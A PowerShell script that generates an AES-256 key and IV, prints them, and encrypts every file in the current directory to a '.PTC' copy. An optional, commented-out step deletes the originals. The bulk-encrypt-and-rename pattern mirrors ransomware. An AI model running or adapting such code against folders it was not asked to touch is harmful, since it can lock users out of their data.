# Function to generate a random key and IV for AES encryption
function Generate-AesKeyAndIv {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256  # Choose 128, 192, or 256 for AES key size

    $aes.GenerateKey()
    $aes.GenerateIV()

    # Output the raw byte arrays (correct sizes for AES)
    [PSCustomObject]@{
        Key = $aes.Key
        IV = $aes.IV
    }
}

# Function to encrypt a file using AES
function Encrypt-File {
    param (
        [byte[]]$key,
        [byte[]]$iv,
        [string]$inputFilePath,
        [string]$outputFilePath
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key  # Use the generated key
    $aes.IV = $iv    # Use the generated IV

    $encryptor = $aes.CreateEncryptor()

    try {
        $inputStream = [System.IO.File]::OpenRead($inputFilePath)
        $outputStream = [System.IO.File]::OpenWrite($outputFilePath)

        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $buffer = New-Object byte[] 4096
        $bytesRead = 0
        while (($bytesRead = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.FlushFinalBlock()
    }
    finally {
        $inputStream.Close()
        $cryptoStream.Close()
        $outputStream.Close()
    }
}

# Generate AES key and IV
$keyAndIv = Generate-AesKeyAndIv
$key = $keyAndIv.Key
$iv = $keyAndIv.IV

# Output the generated key and IV (for reference)
Write-Output "Generated AES Key: $([BitConverter]::ToString($key) -replace '-','')"
Write-Output "Generated AES IV: $([BitConverter]::ToString($iv) -replace '-','')"

# Get all files in the current directory
$files = Get-ChildItem -Path . -File

foreach ($file in $files) {
    $inputFilePath = $file.FullName
    $outputFilePath = "$($file.FullName).PTC"
    
    Encrypt-File -key $key -iv $iv -inputFilePath $inputFilePath -outputFilePath $outputFilePath
    
    # Optionally, delete the original file after encryption
    # Remove-Item -Path $inputFilePath
}

Write-Output "Encryption complete."
